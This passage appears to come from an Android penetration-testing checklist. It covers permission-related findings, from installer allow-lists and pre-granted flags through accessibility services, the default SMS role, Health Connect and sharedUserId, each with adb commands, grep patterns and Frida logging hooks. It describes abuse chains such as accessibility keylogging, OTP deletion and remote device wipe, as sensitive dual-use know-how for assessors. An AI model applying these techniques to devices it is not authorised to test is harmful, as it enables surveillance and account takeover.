| **Severity ceiling** | Medium (Low if only a stale cached value leaks) |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (varies) |
| **Attacker** | n/a — this is a client-behaviour finding against the user's own stated choice |
| **Applies to** | Android 10+ for the location tri-state; Android 11+ for camera/mic and one-time permissions |
| **Maps to** | AOSP `Permissions.md` — *"foreground: app-op mode is `MODE_ALLOWED`; background: app-op mode switches to `MODE_IGNORED`; `ACCESS_BACKGROUND_LOCATION` keeps the mode at `MODE_ALLOWED`"*; AOSP security-model paper §4.3.2 on the third state granting access *"only when an app is in the foreground, i.e. when it either has a visible activity or runs a foreground service with permanent notification"*; ATT&CK T1541 Foreground Persistence, T1430 |

- **Test:** The platform implements "while in use" by flipping the app-op to `MODE_IGNORED` on backgrounding — it does **not** throw. Test what the app does with the resulting empty data: silently uploading a stale or default value, or escalating to a foreground service purely to keep the op at `MODE_ALLOWED`.
- **How:**
  ```bash
  adb shell dumpsys appops | grep -A6 -E 'COARSE_LOCATION|FINE_LOCATION|CAMERA|RECORD_AUDIO'
  adb shell am start -n com.target.app/.MainActivity     # foreground
  adb shell input keyevent KEYCODE_HOME                  # background
  adb shell dumpsys appops | sed -n '/com.target.app/,/^  Uid/p'     # watch the mode change
  adb shell dumpsys activity services com.target.app | grep -i foreground
  adb shell dumpsys location | sed -n '/Active Requests/,/^$/p'
  ```
- **Proof:** `dumpsys appops` showing the op transitioning `MODE_ALLOWED` -> `MODE_IGNORED` on backgrounding, alongside either a foreground-service notification raised purely to hold the op open, or a proxied network capture showing a location record submitted while the op was ignored.
- **Escalation:** -> D20 privacy finding once the data reaches a backend; -> the D15 BOLA test on the location-read endpoint, which is where this class produces its highest severity.
- **Ruled out when:** The app takes the "while in use" branch correctly — `dumpsys location` shows no active request while backgrounded and the proxy shows no location submission — or the app holds `ACCESS_BACKGROUND_LOCATION` with an explicit, user-granted "Allow all the time" that the Settings screen confirms.

### D03-049 · Restricted permissions and installer-granted allow-list exemptions

| | |
|---|---|
| **Severity ceiling** | **High** (for an app-store / enterprise-installer target) |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-08 / AM-09 (the installer is the third party making the decision) |
| **Applies to** | Android 10+ |
| **Maps to** | AOSP `Permissions.md` — `RESTRICTION_UPGRADE_EXEMPT` (*"whitelisted during P→Q upgrade"*), `RESTRICTION_INSTALLER_EXEMPT` (*"whitelisted by installer via `PackageInstaller.SessionParams.setWhitelistedRestrictedPermissions()`"*), `RESTRICTION_SYSTEM_EXEMPT`; `source.android.com/docs/core/permissions/runtime_perms` — *"hard restrictions: apps can't be granted permissions that aren't allowlisted"*, and allowlisting *"occurs during installation or upgrade, not through user action"* |

- **Test:** Hard-restricted permissions (the SMS and Call Log classes) cannot be granted without an allow-list entry, and the allow-list is set by the **installer**, not the user. On an engagement covering an app store or enterprise installer, `setWhitelistedRestrictedPermissions()` is an access-control decision made by a third party on the user's behalf.
- **How:**
  ```bash
  adb shell dumpsys package com.target.app | grep -E 'RESTRICTION_(UPGRADE|INSTALLER|SYSTEM)_EXEMPT'
  adb shell dumpsys package com.target.app | sed -n '/runtime permissions/,/^$/p'
  grep -rn 'setWhitelistedRestrictedPermissions' sources/     # on an installer target
  ```
- **Proof:** A `dumpsys package` runtime-permission flag containing `RESTRICTION_INSTALLER_EXEMPT` on a permission the app had no user-facing justification for — proving the installer, not the user, widened the app's reach.
- **Escalation:** A restricted permission the user never saw a prompt for (SMS/Call Log) is a direct privacy and data-access finding -> D20; on an installer target it is an authorisation-model finding in its own right.
- **Ruled out when:** No runtime permission carries an `_EXEMPT` flag, or the only exemptions are `RESTRICTION_UPGRADE_EXEMPT` on an app that legitimately held the permission before the Android 10 restriction landed.

### D03-050 · `GRANTED_BY_DEFAULT` / `SYSTEM_FIXED` flags — read the flags, not just `granted=true`

| | |
|---|---|
| **Severity ceiling** | **High** (on an OEM engagement) |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (varies); `broken_access_control.privilege_escalation` (null) if it yields a capability the user cannot revoke |
| **Attacker** | n/a — this is a multi-party-authorisation violation, not an attack |
| **Applies to** | Android 6.0+ |
| **Maps to** | AOSP `Permissions.md` flags `USER_SET`, `USER_FIXED` (*"permanently denied; future requests denied without UI"*), `SYSTEM_FIXED` (*"required for normal device operation; user cannot revoke"*), `GRANTED_BY_DEFAULT` (*"pre-granted via `DefaultPermissionGrantPolicy`"*); `source.android.com/docs/core/permissions/runtime_perms` — OEMs may pre-grant for default handlers but *"pre-installed apps cannot bypass the runtime model — users retain revocation rights"* |

- **Test:** `GRANTED_BY_DEFAULT` means `DefaultPermissionGrantPolicy` pre-granted it with no user interaction; `SYSTEM_FIXED` means the user cannot revoke it. A third-party app holding either is anomalous and normally means an OEM pre-grant.
- **How:**
  ```bash
  adb shell dumpsys package com.target.app | sed -n '/runtime permissions/,/^$/p'
  # lines look like:
  #   android.permission.READ_EXTERNAL_STORAGE: granted=true, flags=[ SYSTEM_FIXED|GRANTED_BY_DEFAULT ]
  #   android.permission.ACCESS_FINE_LOCATION: granted=false, flags=[ USER_SET|USER_FIXED ]
  adb shell ls /etc/permissions/*default-permissions* 2>/dev/null
  adb shell cat /etc/permissions/default-permissions*.xml 2>/dev/null | grep -A5 com.target
  ```
- **Proof:** A `dumpsys package` line showing a dangerous permission `granted=true, flags=[GRANTED_BY_DEFAULT]` on a non-default-handler third-party app, with the Settings screen confirming no prompt was ever shown.
- **Escalation:** -> D25 OEM finding; -> D20 privacy finding. On an OEM engagement this is a direct violation of the platform's multi-party-authorisation rule.
- **Ruled out when:** Every dangerous permission the app holds shows `flags=[USER_SET]` or `flags=[USER_SET|USER_FIXED]`, i.e. the grant state came from the user.

### D03-051 · `NEARBY_WIFI_DEVICES` without `usesPermissionFlags="neverForLocation"`

| | |
|---|---|
| **Severity ceiling** | Medium — undisclosed location derivation under a non-location permission; the P4 VRT node caps it |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (varies); `privacy_concerns.unnecessary_data_collection.wifi_ssid_password` (P4) when SSID/credential material is collected |
| **Attacker** | n/a — client-behaviour finding |
| **Applies to** | targetSdk 33+ (Android 13+) |
| **Maps to** | `developer.android.com/about/versions/13/behavior-changes-13` — `NEARBY_WIFI_DEVICES` in the `NEARBY_DEVICES` group, and `android:usesPermissionFlags="neverForLocation"` |

- **Test:** Android 13 introduced `NEARBY_WIFI_DEVICES` so apps can do Wi-Fi work without `ACCESS_FINE_LOCATION`. The `neverForLocation` assertion is what stops the results being location data. An app that declares the permission **without** the flag and then ships BSSIDs or scan results off-device is deriving location under a permission the user was told is not location.
- **How:**
  ```bash
  grep -n -A2 'NEARBY_WIFI_DEVICES' merged.xml     # look for usesPermissionFlags
  grep -n -A2 'BLUETOOTH_SCAN' merged.xml          # same flag applies here
  ```
  ```javascript
  Java.perform(() => {
    const WM = Java.use('android.net.wifi.WifiManager');
    WM.getScanResults.implementation = function () {
      const r = this.getScanResults();
      console.log('[scan] n=' + r.size());
      return r;
    };
  });
  ```
- **Proof:** Scan results hooked, and the same BSSIDs then appearing in a Burp request body.
- **Escalation:** -> D20 data-safety mismatch (the Play declaration will not mention location).
- **Ruled out when:** The permission carries `android:usesPermissionFlags="neverForLocation"`, or the app also holds a user-granted `ACCESS_FINE_LOCATION` with a matching data-safety declaration.

### D03-052 · Attribution tags and `AppOpsManager.OnOpNotedCallback` — attribute every protected-data read to the SDK that made it

| | |
|---|---|
| **Severity ceiling** | **High** (when it proves an undeclared SDK collects a dangerous-permission data type) |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (varies); escalates to `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) |
| **Attacker** | AM-08 |
| **Applies to** | Android 11+ (API 30) for the callback; `<attribution android:tag>` required for targetSdk 31+ |
| **Maps to** | `developer.android.com/guide/topics/data/audit-access` — `AppOpsManager.OnOpNotedCallback`, `onNoted(SyncNotedAppOp)`, `onSelfNoted`, `onAsyncNoted(AsyncNotedAppOp)`, `setOnOpNotedCallback(mainExecutor, cb)`, `SyncNotedAppOp.op` / `.attributionTag`, `AsyncNotedAppOp.getMessage()`, and `<attribution android:tag="sharePhotos" android:label="@string/..."/>` |

- **Test:** Two findings from one hook. (a) Who inside the process actually reads the protected data — the app, or a bundled SDK? (b) Does the app attribute reads honestly? An app that runs everything under the default (`null`) attribution, or under a misleading tag, gives the user's Privacy Dashboard an inaccurate account of why data was accessed.
- **How:**
  ```bash
  grep -n '<attribution ' merged.xml
  grep -rn 'createAttributionContext' sources/
  ```
  ```javascript
  Java.perform(() => {
    const ctx = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
    const Cb = Java.registerClass({
      name: 'com.pt.OpCb',
      superClass: Java.use('android.app.AppOpsManager$OnOpNotedCallback'),
      methods: {
        onNoted(op) {
          console.log('[noted] ' + op.getOp() + ' tag=' + op.getAttributionTag() + '\n' +
            Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()));
        },
        onSelfNoted(op) { console.log('[self] ' + op.getOp()); },
        onAsyncNoted(op) { console.log('[async] ' + op.getOp() + ' msg=' + op.getMessage()); }
      }
    });
    ctx.getSystemService(Java.use('android.app.AppOpsManager').class)
       .setOnOpNotedCallback(ctx.getMainExecutor(), Cb.$new());
  });
  ```
- **Proof:** Stack traces naming a third-party package as the caller of a location or contacts read, with the op name and attribution tag; or a background location read reported under a tag labelled "Share photos", or under no tag while the app declares several.
- **Escalation:** -> D18 SDK accountability, -> D20 data-safety mismatch. Google Play's "Using SDKs safely and securely" makes the app developer responsible: *"app developers are required to treat any data collection from within their app by an SDK as if they collected it directly."*
- **Ruled out when:** Every noted op's stack trace resolves into the app's own package, and each op's `attributionTag` matches an `<attribution android:label>` that accurately names the feature.

### D03-053 · SDK-injected permissions and components — attribute them, then find who consumes them

| | |
|---|---|
| **Severity ceiling** | Medium — the High is D18/D20's once you demonstrate the SDK's collection and egress |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (varies) |
| **Attacker** | AM-08 |
| **Applies to** | all; `AD_ID` specifically at targetSdk 33+ |
| **Maps to** | `developer.android.com/about/versions/13/behavior-changes-13` — `AD_ID` required for targetSdk 33+, *"if SDKs declare this permission, it auto-merges into app manifest"*, and without it the ID is *"replaced with string of zeroes"*; Oversecured's SDK-security research on SDKs *"declaring broader permissions than documented"*; Google Play "Using SDKs safely and securely" |

- **Test:** AARs merge their `<uses-permission>` and their components into the app. Find permissions with no corresponding app feature — they belong to an SDK, and at minimum that is a privacy finding; often it is precisely the capability the SDK's collection code needs.
- **How:**
  ```bash
  aapt2 dump permissions base.apk
  # attribute each to the AAR that injected it
  ./gradlew :app:processReleaseManifest
  grep -n -A3 'uses-permission' app/build/outputs/logs/manifest-merger-release-report.txt
  # then find the consumer OUTSIDE the app's own package
  grep -rnE 'getLastKnownLocation|requestLocationUpdates|TelephonyManager|getInstalledPackages|AdvertisingIdClient' sources/ \
    | grep -v '^sources/com/<appPkg>/'
  # cross-platform variants
  grep -rn '@Permission(' sources/ | head          # Capacitor plugin annotations
  grep -rn '"permissions"' out/assets/www/cordova_plugins.js 2>/dev/null
  ```
- **Proof:** The merger-report line attributing, say, `ACCESS_FINE_LOCATION` or `AD_ID` to a named analytics AAR, plus a jadx hit showing that AAR's own code calling the protected API and posting to its own endpoint, plus the request in Burp with a non-zero AAID or a lat/long tuple.
- **Escalation:** -> D18 SDK supply chain, D20 data-safety mismatch. `QUERY_ALL_PACKAGES` added by an SDK on a `targetSdk >= 30` app restores a device-fingerprinting surface the platform deliberately removed.
- **Ruled out when:** Every merged permission traces to the app's own manifest in the merger report, or to an SDK whose use of it maps to a feature visible in the app and named in the Play Data safety declaration.

### D03-054 · Device-administrator receiver (`BIND_DEVICE_ADMIN`) with an attacker-reachable policy sink

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `broken_access_control.privilege_escalation` (null); the destructive outcome files under `application_level_denial_of_service_dos.critical_impact_and_or_easy_difficulty` (P2) |
| **Attacker** | AM-03 (to reach the sink) |
| **Applies to** | all. From **Android 7**, `resetPassword()` is restricted to device/profile owners — arbitrary passcode reset by a plain admin app is **LEGACY**; `lockNow()` and `wipeData()` remain available to admins. |
| **Maps to** | ATT&CK **T1626.001** Device Administrator Permissions (detection: *"checking for the `BIND_DEVICE_ADMIN` string in app manifests"*; capabilities listed are reset passwords, factory reset, disable cameras, prevent uninstall), T1626 with mitigation **M1013** (*"applications very rarely require administrator permission"*), detection **DET0642**; T1629.002 Device Lockout; T1630.002 File Deletion; T1642 Endpoint Denial of Service |

- **Test:** Does the manifest contain a receiver with `android.permission.BIND_DEVICE_ADMIN` and a `DEVICE_ADMIN_ENABLED` filter, and — the half that decides the severity — can an attacker-reachable input reach the `DevicePolicyManager` call?
- **How:**
  ```bash
  grep -rn "BIND_DEVICE_ADMIN\|DeviceAdminReceiver\|DEVICE_ADMIN_ENABLED" merged.xml
  grep -rn 'android:resource="@xml/device_admin' merged.xml
  cat out/res/xml/device_admin*.xml     # <uses-policies> is the actual capability list
  grep -rnE 'DevicePolicyManager|lockNow|resetPassword|wipeData|setCameraDisabled|isAdminActive' sources/
  adb shell dpm list-owners
  ```
- **Proof:** `res/xml/device_admin*.xml` declaring `<wipe-data/>`, `<reset-password/>` or `<force-lock/>`, plus a code path invoking the matching `DevicePolicyManager` method **from an exported component**. Demonstrate by activating admin and driving the path from the PoC app — show `lockNow()` firing.
- **Escalation:** Admin + an exported component that triggers the policy call is remote device lockout or wipe (-> D04/D05). That is the Critical version; admin requested with no attacker-reachable sink is Medium over-privilege.
- **Ruled out when:** No `BIND_DEVICE_ADMIN` receiver exists; or the `<uses-policies>` list contains only non-destructive policies **and** every `DevicePolicyManager` call site is reachable only from a non-exported component after an authenticated in-app action.

### D03-055 · AccessibilityService scope — `typeAllMask` with no `packageNames` allow-list

| | |
|---|---|
| **Severity ceiling** | **Critical** (when captured text egresses); High otherwise |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) when the captured text leaves the device |
| **Attacker** | AM-08 (the SDK inside the app) / AM-02 (the user is walked through enabling it) |
| **Applies to** | all |
| **Maps to** | ATT&CK **T1453** Abuse Accessibility Features, **T1417.001** Keylogging (*"registering an `AccessibilityService` class, overriding the `onAccessibilityEvent` method, and listening for the `AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED` event type"*), **T1516** Input Injection, detection **DET0697**, mitigation **M1012** (`DevicePolicyManager.setPermittedAccessibilityServices`); FluBot **S1067**, Chameleon (bypasses biometric auth and prevents uninstallation) |

- **Test:** Does the app bind `android.accessibilityservice.AccessibilityService`, and what does its config request? `canRetrieveWindowContent` + `TYPE_VIEW_TEXT_CHANGED` + `flagRequestFilterKeyEvents` together are a keylogger's exact shape; `canPerformGestures` is an input-injection shape. In an assessment of a *legitimate* app the finding is almost always "over-scoped service".
- **How:**
  ```bash
  grep -rn "BIND_ACCESSIBILITY_SERVICE\|accessibilityservice" merged.xml
  cat out/res/xml/*accessib*.xml
  grep -rnE 'canRetrieveWindowContent|canPerformGestures|accessibilityEventTypes|typeAllMask|flagRequestFilterKeyEvents|packageNames' out/res/xml/*
  grep -rnE 'onAccessibilityEvent|TYPE_VIEW_TEXT_CHANGED|performGlobalAction|GLOBAL_ACTION_BACK|dispatchGesture|ACTION_SET_TEXT' sources/
  adb shell settings get secure enabled_accessibility_services
  ```
- **Proof:** `accessibilityEventTypes="typeAllMask"` with `packageNames` **absent** — the service observes every app, not just its own — plus an `onAccessibilityEvent` body that reads `getText()`/`getSource()`. Demonstrate by enabling the service and typing a password into an unrelated app while a Frida hook on `onAccessibilityEvent` logs the characters.
- **Escalation:** -> D13/D21 (biometric-prompt bypass, uninstall prevention), -> D23 (automated in-app transactions), -> D20 if the text egresses.
- **Ruled out when:** The service config names a `packageNames` allow-list limited to the app's own package, uses the narrowest `accessibilityEventTypes` its feature needs, and does not set `canRetrieveWindowContent` or `canPerformGestures` unless the feature demonstrably requires them.

### D03-056 · Default-SMS-handler role and `SMS_DELIVER` — read, send, and erase

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_authentication_and_session_management.two_fa_bypass` (P3) via the OTP chain; escalates to `broken_authentication_and_session_management.authentication_bypass` (P1) when the captured OTP completes an ATO |
| **Attacker** | AM-02 (the role change needs a tap) |
| **Applies to** | The default-SMS-handler model with `SMS_DELIVER` dates from **Android 4.4**. Apps below that used `SMS_RECEIVED` with `abortBroadcast` — LEGACY. |
| **Maps to** | ATT&CK **T1582** SMS Control (*"if the app is set as the default SMS handler on the device, the `SMS_DELIVER` broadcast intent can be registered, which allows the app to write to the SMS content provider"*), **T1636.004** SMS Messages (*"most applications do not need access to SMS messages"*), **T1643** Generate Traffic from Victim, **T1644** Out of Band Data |

- **Test:** Does the app request the default-SMS role or register `SMS_DELIVER`? Only the default handler receives it — and the default handler can **write** to the SMS provider, which is how OTP records are erased after use.
- **How:**
  ```bash
  grep -rn "SMS_DELIVER\|SMS_RECEIVED\|RoleManager\|ROLE_SMS\|ACTION_CHANGE_DEFAULT\|Telephony.Sms.Intents" merged.xml sources/
  aapt2 dump permissions base.apk | grep -E "SEND_SMS|RECEIVE_SMS|READ_SMS|BROADCAST_SMS|WRITE_SMS"
  adb shell settings get secure sms_default_application
  adb shell dumpsys role | grep -i SMS
  grep -rn 'ContentResolver.*delete.*Telephony' sources/
  ```
- **Proof:** The app registered for `SMS_DELIVER` plus a code path calling `ContentResolver.delete(Telephony.Sms.CONTENT_URI, ...)`. Send an SMS to the device and show the record removed afterwards:
  ```bash
  adb shell content query --uri content://sms --projection body
  ```
- **Escalation:** Default-SMS-handler -> OTP capture and deletion -> account takeover on any SMS-2FA flow (D13), and -> premium-rate billing fraud (D23).
- **Ruled out when:** The app does not register `SMS_DELIVER` and does not request `ROLE_SMS`; or it does, is genuinely a messaging app, and no code path deletes or forwards message bodies outside the device.

### D03-057 · `USE_EXACT_ALARM` and `USE_FULL_SCREEN_INTENT` — auto-granted permissions that dodge the prompt

| | |
|---|---|
| **Severity ceiling** | **High** (full-screen-intent target is attacker-influenced); Low-Medium for the exact-alarm auto-grant case |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) for the FSI phishing surface |
| **Attacker** | AM-01/AM-09 (a push payload) for the FSI case |
| **Applies to** | `USE_EXACT_ALARM` Android 13+; `SCHEDULE_EXACT_ALARM` default-deny for new installs from **Android 14**; the FSI restriction applies at **targetSdk 34+**, the capability check is Android 14+ |
| **Maps to** | `developer.android.com/about/versions/13/features` (`USE_EXACT_ALARM` auto-granted, restricted to alarm/timer/calendar apps); `developer.android.com/about/versions/14/behavior-changes-all` (`SCHEDULE_EXACT_ALARM` no longer pre-granted; compat flag `REQUIRE_EXACT_ALARM_PERMISSION`); `developer.android.com/about/versions/14/behavior-changes-14` (`USE_FULL_SCREEN_INTENT`, `NotificationManager.canUseFullScreenIntent()`, `Settings.ACTION_MANAGE_APP_USE_FULL_SCREEN_INTENT`, *"limits this to calling and alarm apps"*) |

- **Test:** (a) `USE_EXACT_ALARM` is granted automatically and is restricted to alarm/timer and calendar apps; an app declaring it to dodge the user-grantable `SCHEDULE_EXACT_ALARM` prompt is abusing an auto-grant. (b) `USE_FULL_SCREEN_INTENT` held by a non-calling, non-alarm app lets it raise a full-screen UI over the lock screen — a phishing surface, and a severe one when the FSI target is attacker-influenced through a deep link or push payload.
- **How:**
  ```bash
  grep -nE 'USE_EXACT_ALARM|SCHEDULE_EXACT_ALARM|USE_FULL_SCREEN_INTENT' merged.xml
  adb shell dumpsys package com.target.app | grep -i -E 'exact_alarm|full_screen'
  adb shell am compat disable REQUIRE_EXACT_ALARM_PERMISSION com.target.app    # test the pre-12 path
  ```
  ```javascript
  Java.perform(() => {
    const NM = Java.use('android.app.NotificationManager');
    NM.canUseFullScreenIntent.implementation = function () {
      const v = this.canUseFullScreenIntent();
      console.log('[fsi] canUseFullScreenIntent=' + v);
      return v;
    };
  });
  ```
- **Proof:** (a) `USE_EXACT_ALARM: granted=true` in `dumpsys` for an app with no alarm or calendar function, with exact alarms then scheduling background wakeups. (b) A full-screen activity rendered over the lock screen after an attacker-influenced notification, recorded on video.
- **Escalation:** (a) -> D25 persistence. (b) -> D24 (the notification-injection half) -> D13 credential capture.
- **Ruled out when:** Neither permission is declared; or `USE_EXACT_ALARM` is held by an app that genuinely is a clock/calendar/timer app, and every full-screen-intent target is a compile-time-constant component with no attacker-controllable extras.

### D03-058 · Health Connect `android.permission.health.*` — the most sensitive permission family most checklists ignore

| | |
|---|---|
| **Severity ceiling** | **Critical** (reproductive or mental-health records leaving the device to a third party) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) — argue the special-category nature explicitly |
| **Attacker** | AM-08 / AM-09 |
| **Applies to** | apps integrating Health Connect; Android 14+ ships it as a platform component. At **targetSdk 36+** the granular `android.permission.health.READ_HEART_RATE` etc. **replace** `BODY_SENSORS`, and `READ_HEALTH_DATA_IN_BACKGROUND` replaces `BODY_SENSORS_BACKGROUND`. |
| **Maps to** | `developer.android.com/health-and-fitness/guides/health-connect/plan/data-types` (the exact permission strings); `developer.android.com/health-and-fitness/guides/health-connect` (`HealthConnectClient`, `READ_HEALTH_DATA_IN_BACKGROUND`, `READ_HEALTH_DATA_HISTORY`, and the required privacy-policy activity with `android.intent.action.VIEW_PERMISSION_USAGE`) |

- **Test:** `android.permission.health.*` is a large, granular, per-data-type family covering reproductive health (`READ_MENSTRUATION`, `READ_SEXUAL_ACTIVITY`), glucose, blood pressure and mental wellness (`READ_MINDFULNESS`), plus two force multipliers: `READ_HEALTH_DATA_IN_BACKGROUND` and `READ_HEALTH_DATA_HISTORY`. Audit what the app declares against what it functionally needs, and whether the rationale/privacy-policy activity is a real disclosure or a stub.
- **How:**
  ```bash
  grep -n 'android.permission.health' merged.xml | sort
  grep -n 'VIEW_PERMISSION_USAGE\|ACTION_SHOW_PERMISSIONS_RATIONALE\|ViewPermissionUsageActivity' merged.xml
  adb shell dumpsys package com.target.app | grep -A40 'runtime permissions' | grep health
  # and the legacy path that bypasses the Health Connect decision entirely:
  grep -rnE 'BODY_SENSORS|TYPE_HEART_RATE|health\.READ_HEART_RATE' merged.xml sources/
  ```
- **Proof:** Declared `android.permission.health.READ_SEXUAL_ACTIVITY` plus `READ_HEALTH_DATA_IN_BACKGROUND` in an app with no corresponding feature, with the data appearing in a network request. Or, for the bypass variant, `BODY_SENSORS` declared at `targetSdk=36` alongside a code path reading heart rate through a raw `Sensor.TYPE_HEART_RATE` or vendor SDK route that never touches the user's Health Connect decision.
- **Escalation:** -> D20 data-safety mismatch; -> D15 if the backend stores it unencrypted or exposes it by a guessable identifier (that combination is the Critical version).
- **Ruled out when:** Every declared `health.*` permission maps to a visible feature, the app ships a real `VIEW_PERMISSION_USAGE` rationale activity with substantive content, and no non-Health-Connect sensor route reads the same data types.

### D03-059 · `MANAGE_EXTERNAL_STORAGE` / `requestLegacyExternalStorage` — the scoped-storage escape

| | |
|---|---|
| **Severity ceiling** | **High** (when the shared-storage file holds credentials or PII) |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage` (**P4**) |
| **Attacker** | AM-04 (a second app with storage/media access) |
| **Applies to** | `requestLegacyExternalStorage` is honoured only at **targetSdk 29**; ignored from targetSdk 30. `MANAGE_EXTERNAL_STORAGE` (API 30+) is the modern equivalent and is Play-policy restricted — its presence is itself worth chasing. Granular `READ_MEDIA_*` replaced `READ_EXTERNAL_STORAGE` at **API 33**. |
| **Maps to** | MASTG-TEST-0254 context; MASWE-0066; the corpus's warning that a scoped-storage-era "external storage" claim must show the actual read path |

- **Test:** Two halves: does the app opt out of scoped storage or hold "All files access", and — the half that decides severity — does it then *write sensitive data* to shared storage under that opt-out, where any app with read access sees it?
- **How:**
  ```bash
  grep -oE 'requestLegacyExternalStorage="[^"]*"|preserveLegacyExternalStorage="[^"]*"' merged.xml
  grep -oE 'MANAGE_EXTERNAL_STORAGE|WRITE_EXTERNAL_STORAGE|READ_EXTERNAL_STORAGE|READ_MEDIA_[A-Z]+' merged.xml
  adb shell ls -laR /sdcard/Android/data/com.target/ /sdcard/Download/ /sdcard/Android/media/com.target/ 2>/dev/null
  grep -rnE 'getExternalStorage|getExternalFilesDir|MediaStore' sources/
  ```
  Then read it back **from a second installed app**, not from `adb shell` — the read path is the finding.
- **Proof:** A file under `/sdcard/` containing tokens, PII or a downloaded document, read successfully by a second app you install. Name the read path explicitly (`MANAGE_EXTERNAL_STORAGE`, MediaStore, the Downloads collection, or `Android/media` which sits outside the per-app SELinux category sandbox).
- **Escalation:** -> D11 plaintext-token theft -> D13 ATO. Note that scoped storage from targetSdk 29 (enforced 30) means `/sdcard/Android/data/<pkg>` is **not** freely readable on a modern target — an external-storage claim without a demonstrated read path is the single most common over-claim in mobile reports.
- **Ruled out when:** No legacy opt-out, no `MANAGE_EXTERNAL_STORAGE`, and nothing sensitive written outside `getFilesDir()`/`getExternalFilesDir()` — or, where it is written outside, a second app on a scoped-storage device cannot read it.

### D03-060 · Privileged-permission tiers on preloaded and OEM apps

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 |
| **Applies to** | preloaded / OEM / carrier apps only |
| **Maps to** | MASTG-KNOW-0017 (the risk-scored permission table, sourced from the Uraniborg "Device Preloaded App Risks Scoring Metrics" paper), MASTG-TEST-0364/-0365/-0366, MASWE-0018 |

- **Test:** For preloaded or OEM apps in scope, enumerate the `signature` / `signatureOrSystem` / privileged permissions they hold and treat each as an attack-surface multiplier: an exported component in such an app is a path to those capabilities.
- **How:**
  ```bash
  adb shell pm list packages -s -f                       # system packages + paths
  adb shell dumpsys package com.oem.app | grep -A40 "requested permissions:"
  aapt2 d permissions com.oem.app.apk
  adb shell pm list permissions -d -g
  ```
  Cross-reference against MASTG's risk-scored tiers (all `signature` unless noted):
  - **ASTRONOMICAL:** `INSTALL_PACKAGES`.
  - **CRITICAL:** `COPY_PROTECTED_DATA`, `WRITE_SECURE_SETTINGS`, `READ_FRAME_BUFFER`, `MANAGE_CA_CERTIFICATES`, `MANAGE_APP_OPS_MODES`, `GRANT_RUNTIME_PERMISSIONS`, `DUMP`, `SYSTEM_CAMERA` (signatureOrSystem), `MANAGE_PROFILE_AND_DEVICE_OWNERS`, `MOUNT_UNMOUNT_FILESYSTEMS`, `DYNAMIC_INSTRUMENTATION`, `BIND_ACCESSIBILITY_SERVICE`, `INJECT_KEY_EVENTS`, `RECORD_SENSITIVE_CONTENT`, `RECEIVE_SENSITIVE_NOTIFICATIONS`, `PROVIDE_DEFAULT_ENABLED_CREDENTIAL_SERVICE`, `PROVIDE_REMOTE_CREDENTIALS`, `THREAD_NETWORK_PRIVILEGED`, `ALLOW_CONTROL_SYSTEM_REQUIRED_PACKAGES`.
  - **HIGH:** `READ_LOGS`, `GET_PASSWORD`, `CAPTURE_AUDIO_OUTPUT`, `ACCESS_NOTIFICATIONS`, `READ_PRIVILEGED_PHONE_STATE`, `SEND_SMS_NO_CONFIRMATION`, `INTERACT_ACROSS_USERS_FULL`, `BLUETOOTH_PRIVILEGED`, `BIND_AUTOFILL_SERVICE`, `LOCATION_HARDWARE`, `INTERNAL_SYSTEM_WINDOW`, `MANAGE_ONGOING_CALLS`, `READ_DROPBOX_DATA`, `COPY_ACCOUNTS`, `LISTEN_FOR_KEY_ACTIVITY`, `READ_ASSIST_STRUCTURE_SCREEN_CONTENT`, `com.android.voicemail.permission.READ_VOICEMAIL`.
  - **MEDIUM:** `CHANGE_COMPONENT_ENABLED_STATE`, `SYSTEM_ALERT_WINDOW`, `MANAGE_EXTERNAL_STORAGE`, `INTERACT_ACROSS_USERS`, `MANAGE_USERS`, `ACCESS_BLOBS_ACROSS_USERS`, `CONNECTIVITY_INTERNAL`.
- **Proof:** An exported, unprotected component in a package holding one of those permissions, driven from the unprivileged PoC app, with the privileged side effect captured.
- **Escalation:** A confused deputy into `INSTALL_PACKAGES`, `WRITE_SECURE_SETTINGS`, `GRANT_RUNTIME_PERMISSIONS` or `INJECT_KEY_EVENTS` is full device compromise -> D25. Also: on **Android 15+**, a platform-signed but non-system APK whose signature permissions are not allow-listed is treated *"as if the app isn't platform signed"* on a non-debuggable build — check `adb logcat -b all | grep -i 'not in signature permission allowlist'` against `getprop ro.debuggable`, because an app that only works because enforcement is off is a reportable behaviour delta.
- **Ruled out when:** The engagement contains no preloaded/OEM packages, or every privileged permission holder in scope has no exported component reachable from `untrusted_app` (proven by the PoC app receiving `Permission Denial` on each).

### D03-061 · `sharedUserId` — one compromised sibling is all of them

| | |
|---|---|
| **Severity ceiling** | **High** (Critical when a low-assurance sibling is exported and the privileged sibling holds tokens) |
| **VRT** | `broken_access_control.privilege_escalation` (null) escalating through whatever the sibling holds |
| **Attacker** | AM-08 (compromise the weak sibling) / AM-11 |
| **Applies to** | all. **LEGACY declaration** — `android:sharedUserId` deprecated at API 29, deprecated for new users from Android 13 — but still honoured. The documented migration is `android:sharedUserMaxSdkVersion="32"`, and the docs warn **not** to remove `android:sharedUserId` (that breaks updates), so both attributes must be read together. |
| **Maps to** | `developer.android.com/guide/topics/manifest/manifest-element#uid` — apps sharing it *"can access each other's data"* and *"can optionally run in the same process"*; *"apps cannot remove `android:sharedUserId` entirely — migrating off a shared user ID is not supported"*; `developer.android.com/about/versions/13/behavior-changes-all`; AOSP `Permissions.md` — *"shared UIDs share a single permission grant-set"*; AOSP security-model paper §4.3.3 |

